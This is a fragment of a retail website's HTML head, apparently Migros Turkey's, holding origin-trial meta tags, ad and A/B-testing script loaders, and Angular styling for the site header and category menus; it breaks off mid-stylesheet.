    <meta http-equiv="origin-trial" content="As0hBNJ8h++fNYlkq8cTye2qDLyom8NddByiVytXGGD0YVE+2CEuTCpqXMDxdhOMILKoaiaYifwEvCRlJ/9GcQ8AAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3MTk1MzI3OTksImlzU3ViZG9tYWluIjp0cnVlfQ==">
    <meta http-equiv="origin-trial" content="AgRYsXo24ypxC89CJanC+JgEmraCCBebKl8ZmG7Tj5oJNx0cmH0NtNRZs3NB5ubhpbX/bIt7l2zJOSyO64NGmwMAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3MTk1MzI3OTksImlzU3ViZG9tYWluIjp0cnVlfQ==">
    <meta http-equiv="origin-trial" content="A/ERL66fN363FkXxgDc6F1+ucRUkAhjEca9W3la6xaLnD2Y1lABsqmdaJmPNaUKPKVBRpyMKEhXYl7rSvrQw+AkAAACNeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
    <meta http-equiv="origin-trial" content="A6OdGH3fVf4eKRDbXb4thXA4InNqDJDRhZ8U533U/roYjp4Yau0T3YSuc63vmAs/8ga1cD0E3A7LEq6AXk1uXgsAAACTeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MTkzNTk5OTksImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9">
    <script src="https://pagead2.googlesyndication.com/pagead/managed/js/gpt/m202402220101/pubads_impl.js" async=""></script>
    <style type="text/css"></style>
    <link rel="stylesheet" href="https://dev.visualwebsiteoptimizer.com">
    <script type="text/javascript" id="vwoCode">
      window._vwo_code || (function() {
        var account_id = 778565,
          version = 2.0,
          settings_tolerance = 2000,
          hide_element = 'body',
          hide_element_style = 'opacity:0 !important;filter:alpha(opacity=0) !important;background:none !important',
          /* DO NOT EDIT BELOW THIS LINE */
          f = false,
          w = window,
          d = document,
          v = d.querySelector('#vwoCode'),
          cK = '_vwo_' + account_id + '_settings',
          cc = {};
        try {
          var c = JSON.parse(localStorage.getItem('_vwo_' + account_id + '_config'));
          cc = c && typeof c === 'object' ? c : {}
        } catch (e) {}
        var stT = cc.stT === 'session' ? w.sessionStorage : w.localStorage;
        code = {
          use_existing_jquery: function() {
            return typeof use_existing_jquery !== 'undefined' ? use_existing_jquery : undefined
          },
          library_tolerance: function() {
            return typeof library_tolerance !== 'undefined' ? library_tolerance : undefined
          },
          settings_tolerance: function() {
            return cc.sT || settings_tolerance
          },
          hide_element_style: function() {
            return '{' + (cc.hES || hide_element_style) + '}'
          },
          hide_element: function() {
            return typeof cc.hE === 'string' ? cc.hE : hide_element
          },
          getVersion: function() {
            return version
          },
          finish: function() {
            if (!f) {
              f = true;
              var e = d.getElementById('_vis_opt_path_hides');
              if (e) e.parentNode.removeChild(e)
            }
          },
          finished: function() {
            return f
          },
          load: function(e) {
            var t = this.getSettings(),
              n = d.createElement('script'),
              i = this;
            if (t) {
              n.textContent = t;
              d.getElementsByTagName('head')[0].appendChild(n);
              if (!w.VWO || VWO.caE) {
                stT.removeItem(cK);
                i.load(e)
              }
            } else {
              n.fetchPriority = 'high';
              n.src = e;
              n.type = 'text/javascript';
              n.onerror = function() {
                _vwo_code.finish()
              };
              d.getElementsByTagName('head')[0].appendChild(n)
            }
          },
          getSettings: function() {
            try {
              var e = stT.getItem(cK);
              if (!e) {
                return
              }
              e = JSON.parse(e);
              if (Date.now() > e.e) {
                stT.removeItem(cK);
                return
              }
              return e.s
            } catch (e) {
              return
            }
          },
          init: function() {
            if (d.URL.indexOf('__vwo_disable__') > -1) return;
            var e = this.settings_tolerance();
            w._vwo_settings_timer = setTimeout(function() {
              _vwo_code.finish();
              stT.removeItem(cK)
            }, e);
            var t = d.currentScript,
              n = d.createElement('style'),
              i = this.hide_element(),
              r = t && !t.async && i ? i + this.hide_element_style() : '',
              c = d.getElementsByTagName('head')[0];
            n.setAttribute('id', '_vis_opt_path_hides');
            v && n.setAttribute('nonce', v.nonce);
            n.setAttribute('type', 'text/css');
            if (n.styleSheet) n.styleSheet.cssText = r;
            else n.appendChild(d.createTextNode(r));
            c.appendChild(n);
            this.load('https://dev.visualwebsiteoptimizer.com/j.php?a=' + account_id + '&u=' + encodeURIComponent(d.URL) + '&vn=' + version)
          }
        };
        w._vwo_code = code;
        code.init();
      })();
    </script>
    <script fetchpriority="high" src="https://dev.visualwebsiteoptimizer.com/j.php?a=778565&amp;u=https%3A%2F%2Fwww.migros.com.tr%2F&amp;vn=2" type="text/javascript"></script>
    <style>
      .grid[_ngcontent-isc-c377] {
        box-sizing: border-box;
        margin: 0 auto;
        padding: var(--mdc-layout-grid-margin-desktop, 0);
        padding: 0;
        display: grid;
        grid-template-rows: auto auto 1fr auto auto;
        min-height: 100vh
      }

      .divider[_ngcontent-isc-c377] {
        height: .063rem;
        opacity: .12;
        background-color: var(--basicColorBlack);
        padding: 0
      }

      main[_ngcontent-isc-c377] {
        min-height: calc(100vh - 4.875rem);
        padding-bottom: var(--mobile-bottom-nav-height)
      }

      @media (min-width: 992px) {
        main[_ngcontent-isc-c377] {
          padding-bottom: unset
        }
      }

      .remove-padding-bottom[_ngcontent-isc-c377] {
        padding-bottom: unset
      }

      main-reload[_ngcontent-isc-c377] {
        color: #2a2a30
      }
    </style>
    <style>
      img[_ngcontent-isc-c157] {
        max-width: 70px;
        scrollbar-width: none;
        -ms-overflow-style: none
      }

      img[_ngcontent-isc-c157]::-webkit-scrollbar {
        width: 0;
        height: 0
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      @media (min-width: 576px) {
        sm-header .header-wrapper {
          border-bottom: 1.25px solid rgba(1, 1, 1, .12)
        }
      }

      sm-header .header-wrapper .inline-banner .swiper-container {
        padding-bottom: 0
      }

      sm-header .header-wrapper .inline-banner .swiper-wrapper {
        margin-top: 0
      }

      sm-header .header-wrapper .inline-banner img {
        width: 100%;
        height: 100%;
        border-radius: 0
      }

      sm-header .header-wrapper .header-top-wrapper::-webkit-scrollbar {
        display: none
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .header-top-wrapper {
          width: 100vw;
          display: flex;
          overflow-x: scroll;
          overflow-y: hidden
        }
      }

      sm-header .header-wrapper .header-top-wrapper .header-top {
        display: flex;
        height: 60px;
        transition: background-color .15s ease-in-out;
        flex-grow: 1;
        padding: 0 1rem
      }

      @media (min-width: 1200px) {
        sm-header .header-wrapper .header-top-wrapper .header-top {
          padding: 0 7rem
        }
      }

      @media (min-width: 1440px) {
        sm-header .header-wrapper .header-top-wrapper .header-top {
          padding: 0 11rem
        }
      }

      @media (min-width: 1600px) {
        sm-header .header-wrapper .header-top-wrapper .header-top {
          padding: 0 11rem
        }
      }

      @media (min-width: 1800px) {
        sm-header .header-wrapper .header-top-wrapper .header-top {
          padding: 0 18rem
        }
      }

      sm-header .header-wrapper .header-top-wrapper .header-top a.selected:after,
      sm-header .header-wrapper .header-top-wrapper .header-top a.selected:before {
        content: "";
        width: 70px;
        height: 47px;
        border: 6px solid;
        position: absolute;
        bottom: -6px;
        border-top: 0;
        z-index: -1
      }

      sm-header .header-wrapper .header-top-wrapper .header-top a.selected:after {
        border-left: 0;
        left: -64px;
        border-bottom-right-radius: 13px
      }

      sm-header .header-wrapper .header-top-wrapper .header-top a.selected:before {
        border-right: 0;
        right: -64px;
        border-bottom-left-radius: 13px
      }

      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.sanalmarket:before,
      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.sanalmarket:after {
        border-color: var(--brandColorPrimary700)
      }

      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.hemen:before,
      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.hemen:after {
        border-color: var(--brandColorHemen700)
      }

      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.yemek:before,
      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.yemek:after {
        border-color: var(--brandColorYemek700)
      }

      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.elektronik:before,
      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.elektronik:after {
        border-color: var(--brandColorInfo600)
      }

      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.mion:before,
      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.mion:after {
        border-color: var(--brandColorMion700)
      }

      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.tazedirekt:before,
      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.tazedirekt:after {
        border-color: var(--brandColorTazedirekt)
      }

      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.macrocenter:before,
      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.macrocenter:after {
        border-color: var(--brandColorMacrocenter)
      }

      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.kurban:before,
      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.kurban:after {
        border-color: var(--brandColorKurbanPrimary700)
      }

      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.money-pay:before,
      sm-header .header-wrapper .header-top-wrapper .header-top a.selected.money-pay:after {
        border-color: #7a4acc
      }

      sm-header .header-wrapper .header-tab {
        cursor: pointer;
        width: 7rem;
        background-repeat: no-repeat;
        align-self: flex-end;
        background-position: center;
        background-color: #fff;
        margin: .45rem;
        margin-left: 0;
        border-radius: 8px;
        height: 2.55rem;
        padding: 1rem;
        background-origin: content-box;
        background-size: cover
      }

      sm-header .header-wrapper .header-tab.selected {
        border-radius: 8px 8px 0 0;
        margin-bottom: 0;
        height: 3rem;
        padding-bottom: 1.35rem;
        position: relative
      }

      sm-header .header-wrapper .header-tab.selected.sanalmarket {
        background-color: var(--brandColorPrimary700);
        background-image: url(assets/logos/sanalmarket/sanalmarket-transparent-logo.svg)
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .header-tab.selected.sanalmarket {
          background-image: url(assets/logos/sanalmarket/sanalmarket-transparent-logo-mobile.svg)
        }
      }

      sm-header .header-wrapper .header-tab.selected.elektronik {
        background-color: var(--brandColorInfo600);
        background-image: url(assets/logos/elektronik/ekstra-transparent-logo.svg)
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .header-tab.selected.elektronik {
          background-image: url(assets/logos/elektronik/ekstra-transparent-logo.svg)
        }
      }

      sm-header .header-wrapper .header-tab.selected.kurban {
        background-color: var(--brandColorKurbanPrimary700);
        background-image: url(assets/logos/kurban/kurban-transparent-logo.svg)
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .header-tab.selected.kurban {
          background-image: url(assets/logos/kurban/kurban-transparent-logo.svg)
        }
      }

      sm-header .header-wrapper .header-tab.selected.hemen {
        background-color: var(--brandColorHemen700);
        background-image: url(assets/logos/hemen/hemen-transparent-logo.svg)
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .header-tab.selected.hemen {
          background-image: url(assets/logos/hemen/hemen-transparent-logo.svg)
        }
      }

      sm-header .header-wrapper .header-tab.selected.yemek {
        background-color: var(--brandColorYemek700);
        background-image: url(assets/logos/yemek/yemek-transparent-logo.svg)
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .header-tab.selected.yemek {
          background-image: url(assets/logos/yemek/yemek-transparent-logo.svg)
        }
      }

      sm-header .header-wrapper .header-tab.selected.tazedirekt {
        background-color: var(--brandColorTazedirekt);
        background-image: url(assets/logos/tazedirekt/td-transparent-logo.svg)
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .header-tab.selected.tazedirekt {
          background-image: url(assets/logos/tazedirekt/td-transparent-logo.svg)
        }
      }

      sm-header .header-wrapper .header-tab.selected.mion {
        background-color: var(--brandColorMion700);
        background-image: url(assets/logos/mion/mion-logo.svg)
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .header-tab.selected.mion {
          background-image: url(assets/logos/mion/mion-logo.svg)
        }
      }

      sm-header .header-wrapper .header-tab.selected.macrocenter {
        background-color: var(--brandColorMacrocenter);
        background-image: url(assets/logos/macrocenter/mc-transparent-logo.svg)
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .header-tab.selected.macrocenter {
          background-image: url(assets/logos/macrocenter/mc-mobile-transparent-logo.svg)
        }
      }

      sm-header .header-wrapper .header-tab.selected.sanalmarket {
        background-size: cover
      }

      sm-header .header-wrapper .header-tab.selected.macrocenter {
        background-size: cover
      }

      sm-header .header-wrapper .header-tab.selected.money-pay {
        background-color: #7a4acc
      }

      sm-header .header-wrapper .header-line {
        height: 6px
      }

      sm-header .header-wrapper .header-line.sanalmarket {
        background-color: var(--brandColorPrimary700)
      }

      sm-header .header-wrapper .header-line.elektronik {
        background-color: var(--brandColorInfo600)
      }

      sm-header .header-wrapper .header-line.kurban {
        background-color: var(--brandColorKurbanPrimary700)
      }

      sm-header .header-wrapper .header-line.hemen {
        background-color: var(--brandColorHemen700)
      }

      sm-header .header-wrapper .header-line.yemek {
        background-color: var(--brandColorYemek700)
      }

      sm-header .header-wrapper .header-line.tazedirekt {
        background-color: var(--brandColorTazedirekt)
      }

      sm-header .header-wrapper .header-line.macrocenter {
        background-color: var(--brandColorMacrocenter)
      }

      sm-header .header-wrapper .header-line.mion {
        background-color: var(--brandColorMion700)
      }

      sm-header .header-wrapper .header-line.money-pay {
        background-color: #7a4acc
      }

      sm-header .header-wrapper .sanalmarket-logo-tab {
        background-image: url(assets/logos/sanalmarket/sanalmarket-logo.svg);
        width: 7.5rem;
        background-size: cover
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .sanalmarket-logo-tab {
          background-size: cover;
          width: 5rem
        }
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .sanalmarket-logo-tab {
          background-image: url(assets/logos/sanalmarket/sanalmarket-logo-mobile.svg);
          background-size: unset;
          width: 5rem
        }
      }

      sm-header .header-wrapper .elektronik-logo-tab {
        background-image: url(assets/logos/elektronik/ekstra-logo.svg);
        width: 6rem;
        background-size: cover
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .elektronik-logo-tab {
          background-size: 3.75rem;
          width: 5rem
        }
      }

      sm-header .header-wrapper .kurban-logo-tab {
        background-image: url(assets/logos/kurban/kurban-logo.svg);
        width: 6rem;
        background-size: cover
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .kurban-logo-tab {
          background-size: unset;
          width: 5rem
        }
      }

      sm-header .header-wrapper .hemen-logo-tab {
        background-image: url(assets/logos/hemen/hemen-logo.svg);
        width: 6rem;
        background-size: cover
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .hemen-logo-tab {
          background-size: unset;
          width: 5rem
        }
      }

      sm-header .header-wrapper .money-pay-logo-tab {
        background-image: url(assets/logos/money-pay/money-pay.png);
        width: 6rem;
        background-size: cover
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .money-pay-logo-tab {
          background-size: 4.5rem auto;
          width: 5rem
        }
      }

      sm-header .header-wrapper .yemek-logo-tab {
        background-image: url(assets/logos/yemek/yemek-logo.svg);
        width: 6rem;
        background-size: cover
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .yemek-logo-tab {
          background-size: 4.5rem auto;
          width: 5rem
        }
      }

      sm-header .header-wrapper .tazedirekt-logo-tab {
        background-image: url(assets/logos/tazedirekt/td-logo.svg);
        width: 6rem;
        background-size: auto 20px
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .tazedirekt-logo-tab {
          background-size: 3.5rem auto;
          width: 5rem
        }
      }

      sm-header .header-wrapper .macrocenter-logo-tab {
        background-image: url(assets/logos/macrocenter/mc-logo.svg);
        width: 6rem;
        background-size: auto 20px
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .macrocenter-logo-tab {
          background-size: cover;
          width: 5rem
        }
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .macrocenter-logo-tab {
          background-image: url(assets/logos/macrocenter/mc-mobile-logo.svg);
          width: 5rem
        }
      }

      sm-header .header-wrapper .mion-logo-tab {
        background-image: url(assets/logos/mion/mion-logo.svg);
        width: 6rem;
        background-size: auto 18px
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .mion-logo-tab {
          background-size: cover;
          width: 5rem
        }
      }

      sm-header .header-wrapper .login-signup-wrapper {
        margin: auto 0 auto 1rem;
        cursor: pointer
      }

      @media (max-width: 992px) {
        sm-header .header-wrapper .login-signup-wrapper {
          display: none
        }
      }

      sm-header .header-wrapper .anonymous {
        display: flex;
        margin: auto 0 auto auto
      }

      @media (max-width: 992px) {
        sm-header .header-wrapper .anonymous {
          display: none
        }
      }

      sm-header .header-wrapper sm-inbox {
        margin: auto .5rem auto auto
      }

      sm-header .header-wrapper fe-account-dropdown {
        margin: auto 0;
        cursor: pointer
      }

      @media (max-width: 992px) {
        sm-header .header-wrapper fe-account-dropdown {
          display: none
        }
      }

      sm-header .header-wrapper fe-account-dropdown .inner {
        padding: .25rem 1rem
      }

      sm-header .header-wrapper .icon {
        background-image: url(assets/icons/black-user.svg);
        min-width: 1rem;
        height: 1rem;
        background-repeat: no-repeat;
        background-size: contain
      }

      sm-header .header-wrapper .inner {
        display: flex;
        align-items: center;
        min-width: 150px;
        max-width: 220px;
        justify-content: space-between;
        background-color: var(--basicColorWhite);
        padding: .5rem;
        border-radius: 8px;
        border: solid 1px rgba(0, 0, 0, .12)
      }

      sm-header .header-wrapper .inner .icon {
        margin-right: .5rem
      }

      sm-header .header-wrapper .inner .carrot {
        margin-left: .5rem
      }

      sm-header .header-wrapper .inner .text-username-wrapper {
        margin: 0 .5rem
      }

      sm-header .header-wrapper .inner .text-username-wrapper .username span {
        display: inline-block;
        max-width: 100px;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap
      }

      sm-header .header-wrapper .header-middle {
        padding: 0 1rem;
        width: 100%;
        display: flex;
        align-items: center;
        position: relative
      }

      @media (min-width: 1200px) {
        sm-header .header-wrapper .header-middle {
          padding: 0 7rem
        }
      }

      @media (min-width: 1440px) {
        sm-header .header-wrapper .header-middle {
          padding: 0 11rem
        }
      }

      @media (min-width: 1600px) {
        sm-header .header-wrapper .header-middle {
          padding: 0 11rem
        }
      }

      @media (min-width: 1800px) {
        sm-header .header-wrapper .header-middle {
          padding: 0 18rem
        }
      }

      @media (min-width: 992px) {
        sm-header .header-wrapper .header-middle {
          min-height: 4.875rem
        }

        sm-header .header-wrapper .header-middle.header-middle-fixed {
          position: fixed;
          top: 0;
          z-index: 4;
          background-color: var(--basicColorWhite);
          box-shadow: 0 6px 20px #a4a4a452
        }
      }

      sm-header .header-wrapper .header-middle .search-wrapper {
        display: flex;
        width: 100%
      }

      @media (max-width: 992px) {
        sm-header .header-wrapper .header-middle .search-wrapper {
          margin: 1rem
        }
      }

      sm-header .header-wrapper .header-middle .search-wrapper sm-inbox {
        margin: auto 0 auto .75rem
      }

      @media (max-width: 992px) {
        sm-header .header-wrapper .header-middle {
          flex-wrap: wrap;
          padding: 0
        }
      }

      sm-header .header-wrapper .header-middle .popover {
        background-color: var(--brandColorInfo600);
        display: flex;
        padding: .75rem;
        color: var(--basicColorWhite);
        flex-direction: column;
        text-align: left;
        animation: presence .15s ease-in-out
      }

      @media (min-width: 992px) {
        sm-header .header-wrapper .header-middle .popover {
          position: absolute;
          top: 75px;
          z-index: 3;
          width: 450px;
          border-radius: 5px
        }

        sm-header .header-wrapper .header-middle .popover:after {
          content: "";
          position: absolute;
          border: 10px solid transparent;
          border-bottom: 10px solid var(--brandColorInfo600);
          top: -20px;
          left: 50%;
          transform: translate(-50%)
        }
      }

      @media (max-width: 992px) {
        sm-header .header-wrapper .header-middle .popover .address-warning-text {
          width: 95%
        }
      }

      sm-header .header-wrapper .header-middle .popover .title-close-btn-wrapper {
        display: flex;
        justify-content: space-between;
        align-items: flex-start;
        margin-top: .5rem;
        margin-right: 1rem
      }

      sm-header .header-wrapper .header-middle .popover .title-close-btn-wrapper fa-icon {
        cursor: pointer
      }

      sm-header .header-wrapper .header-bottom {
        padding: 0 1rem;
        position: relative
      }

      @media (min-width: 1200px) {
        sm-header .header-wrapper .header-bottom {
          padding: 0 7rem
        }
      }

      @media (min-width: 1440px) {
        sm-header .header-wrapper .header-bottom {
          padding: 0 11rem
        }
      }

      @media (min-width: 1600px) {
        sm-header .header-wrapper .header-bottom {
          padding: 0 11rem
        }
      }

      @media (min-width: 1800px) {
        sm-header .header-wrapper .header-bottom {
          padding: 0 18rem
        }
      }

      sm-header .header-wrapper .header-bottom .tabs {
        display: flex;
        margin-top: .5rem;
        position: relative
      }

      @media (max-width: 992px) {
        sm-header .header-wrapper .header-bottom .tabs {
          max-width: 92vw;
          overflow: scroll;
          margin-top: 0;
          margin-left: -.5rem
        }
      }

      sm-header .header-wrapper .header-bottom .tabs>:first-child {
        display: flex
      }

      @media (max-width: 992px) {
        sm-header .header-wrapper .header-bottom .tabs>:first-child {
          display: none
        }

        sm-header .header-wrapper .header-bottom .tabs>#header-campaign {
          display: none
        }

        sm-header .header-wrapper .header-bottom .tabs>#header-migroskop {
          order: 3
        }

        sm-header .header-wrapper .header-bottom .tabs>#header-multiple-discounts {
          order: 4
        }

        sm-header .header-wrapper .header-bottom .tabs>#header-money-discounts {
          order: 5
        }
      }

      sm-header .header-wrapper .header-bottom .tabs .catalog div {
        display: flex;
        align-items: center
      }

      sm-header .header-wrapper .header-bottom .tabs .catalog div img {
        width: 1.25rem;
        margin-right: .375rem
      }

      sm-header .header-wrapper .header-bottom .tabs .tab {
        cursor: pointer;
        position: relative;
        height: 1.75rem;
        padding: 0 .75rem;
        white-space: nowrap
      }

      sm-header .header-wrapper .header-bottom .tabs .tab .hovered-bar {
        position: absolute;
        background-color: var(--brandColorPrimary700);
        bottom: 0;
        left: 0;
        right: 0;
        height: .4rem;
        border-radius: 10px 10px 0 0;
        animation: presence .15s ease-in-out
      }

      sm-header .header-wrapper .header-bottom .tabs .tab .categories-icon {
        display: flex
      }

      sm-header .header-wrapper .header-bottom .tabs .tab .categories-icon .icon {
        background-size: contain;
        width: 17px;
        height: 14px;
        margin-right: 1rem;
        margin-left: -.75rem;
        background-image: url(assets/icons/categories.svg)
      }

      sm-header .header-wrapper .header-bottom .tabs .tab .categories-icon.mion .icon {
        background-size: contain;
        width: 17px;
        height: 14px;
        margin-right: 1rem;
        margin-left: -.75rem;
        background-image: url(assets/icons/mion-categories.svg)
      }

      sm-header .header-wrapper .header-bottom .tabs .tab .categories-icon.electronic .icon {
        background-size: contain;
        width: 17px;
        height: 14px;
        margin-right: 1rem;
        margin-left: -.75rem;
        background-image: url(assets/icons/categories-electronic.png)
      }

      @media (max-width: 576px) {
        sm-header .header-wrapper .header-bottom .tabs .tab {
          padding: .35rem .75rem
        }
      }

      sm-header .header-wrapper .header-bottom .tabs .categories-sub-categories-wrapper {
        position: absolute;
        top: 1.75rem;
        padding-bottom: 0;
        background-color: #fff;
        border-radius: 0 0 10px 10px;
        width: 210px;
        z-index: 1001;
        animation: presence .15s ease-in-out
      }

      sm-header .header-wrapper .header-bottom .tabs .categories-sub-categories-wrapper.expanded {
        width: 100%;
        display: flex
      }

      sm-header .header-wrapper .header-bottom .tabs .categories-sub-categories-wrapper .categories-wrapper {
        padding: 1rem;
        min-width: 300px;
        padding-bottom: 0
      }

      sm-header .header-wrapper .header-bottom .tabs .categories-sub-categories-wrapper .categories-wrapper .categories {
        padding-bottom: 1rem;
        display: flex;
        cursor: pointer;
        align-items: center;
        position: relative
      }

      sm-header .header-wrapper .header-bottom .tabs .categories-sub-categories-wrapper .categories-wrapper .categories.only-in-migros {
        color: var(--brandColorPrimary700);
        font-weight: 700
      }

      sm-header .header-wrapper .header-bottom .tabs .categories-sub-categories-wrapper .categories-wrapper .categories.discount-products {
        color: var(--systemColorSuccess700);
        font-weight: 600
      }

      sm-header .header-wrapper .header-bottom .tabs .categories-sub-categories-wrapper .categories-wrapper .categories.hovered-category {
        color: var(--brandColorPrimary700);
        font-weight: 700
      }

      sm-header .header-wrapper .header-bottom .tabs .categories-sub-categories-wrapper .categories-wrapper .categories.hovered-category .hover-arrow {
        position: absolute;
        right: 0;
        top: -.5rem;
        bottom: .5rem;
        border-top: .95rem solid transparent;
        border-bottom: .95rem solid transparent;
        border-left: 18px solid var(--brandColorPrimary900);
        opacity: .1
      }

      sm-header .header-wrapper .header-bottom .tabs .categories-sub-categories-wrapper .categories-wrapper .categories.hovered-category:before {
        content: "";
        background-color: var(--brandColorPrimary700);
        position: absolute;
        left: -1rem;
        height: 1.9rem;
        width: .313rem;
        border-radius: 0 10px 10px 0
      }

      sm-header .header-wrapper .header-bottom .tabs .categories-sub-categories-wrapper .categories-wrapper .categories.hovered-category:after {
        content: "";
        background-color: var(--brandColorPrimary900);
        position: absolute;
        left: -1rem;
        right: 18px;
        top: -.5rem;
        bottom: .5rem;
        opacity: .1;
        border-radius: 6px 0 0 6px
      }

      sm-header .header-wrapper .header-bottom .tabs .categories-sub-categories-wrapper .sub-categories-wrapper {
        width: 100%;
        background-color: #fff;
        border-radius: 10px 0 10px 10px;
        padding: 1rem 1.375rem 1.375rem 0;
        display: grid;
        grid-template-columns: 1fr 1fr;
        column-gap: 1rem;
        grid-auto-rows: minmax(min-content, max-content)
      }

      sm-header .header-wrapper .header-bottom .tabs .categories-sub-categories-wrapper .sub-categories-wrapper .sub-category-wrapper {
        width: 360px;
        margin: 0 1rem 1rem 0
      }

      sm-header .header-wrapper .header-bottom .tabs .categories-sub-categories-wrapper .sub-categories-wrapper .sub-category-wrapper .category-name:hover {
        text-decoration: underline
      }

      sm-header .header-wrapper .header-bottom .tabs .categories-sub-categories-wrapper .sub-categories-wrapper .sub-category-wrapper .sub-sub-categories-wrapper span {
        cursor: pointer
      }

      sm-header .header-wrapper .header-bottom .tabs .categories-sub-categories-wrapper .sub-categories-wrapper .sub-category-wrapper .sub-sub-categories-wrapper span:hover {
        text-decoration: underline
      }

      sm-header .header-wrapper .header-bottom .backdrop {
        background-color: #00000040;
        position: absolute;
        top: 1.75rem;
        bottom: -1.75rem;
        left: 0;
        right: 0;
        z-index: 2;
        height: 100vh;
        animation: presence .15s ease-in-out
      }

      sm-header .header-wrapper .inner-track {
        padding-left: 1rem
      }

      sm-header .fast-cart-tab .fast-cart-tab-wrapper {
        display: flex
      }

      sm-header .fast-cart-tab .fast-cart-tab-wrapper img {
        width: 1rem;
        margin-right: .5rem
      }

      :host-context(.kurban) .track-wrapper {
        display: none
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      [_nghost-isc-c355] {
        --mdc-typography-button-font-size: .75rem;
        --mdc-typography-button-font-weight: 600
      }

      .additional-row[_ngcontent-isc-c355] {
        padding: .625rem 1rem;
        display: flex;
        align-items: center;
        flex-direction: column;
        background-color: var(--brandColorInfo900);
        color: #fff
      }

      @media (min-width: 1200px) {
        .additional-row[_ngcontent-isc-c355] {
          padding: .625rem 7rem
        }
      }

      @media (min-width: 1440px) {
        .additional-row[_ngcontent-isc-c355] {
          padding: .625rem 11rem
        }
      }

      @media (min-width: 1600px) {
        .additional-row[_ngcontent-isc-c355] {
          padding: .625rem 11rem
        }
      }

      @media (min-width: 1800px) {
        .additional-row[_ngcontent-isc-c355] {
          padding: .625rem 18rem
        }
      }

      @media (min-width: 992px) {
        .additional-row[_ngcontent-isc-c355] {
          flex-direction: row
        }
      }

      @media (min-width: 992px) {
        .additional-row[_ngcontent-isc-c355] {
          height: 3.5rem
        }
      }

      .additional-row[_ngcontent-isc-c355] .info-row[_ngcontent-isc-c355] {
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
        align-items: center
      }

      .additional-row[_ngcontent-isc-c355] .icon-cart[_ngcontent-isc-c355] {
        display: inline-block;
        background-image: url(assets/icons/cart-additional.svg);
        width: 1.5rem;
        height: 1.5rem;
        margin-right: .55rem
      }

      .additional-row[_ngcontent-isc-c355] .bold[_ngcontent-isc-c355] {
        font-weight: 700;
        display: inline-block;
        margin: 0 .2rem
      }

      .additional-row[_ngcontent-isc-c355] button[_ngcontent-isc-c355] {
        margin: .75rem 0 0;
        background-color: var(--brandColorInfo700);
        color: inherit
      }

      @media (min-width: 992px) {
        .additional-row[_ngcontent-isc-c355] button[_ngcontent-isc-c355] {
          margin: 0 0 0 .625rem
        }
      }
    </style>
    <style>
      @keyframes spin {
        0% {
          transform: rotate(0)
        }

        to {
          transform: rotate(360deg)
        }
      }

      @keyframes presence {
        0% {
          opacity: 0
        }

        to {
          opacity: 1
        }
      }

      fe-swiper-banner {
        --swiper-theme-color: var(--primary-color__600);
        display: block
      }

      fe-swiper-banner a {
        cursor: pointer
      }

      fe-swiper-banner .swiper-button-
       {
        pointer-events: auto !important
      }

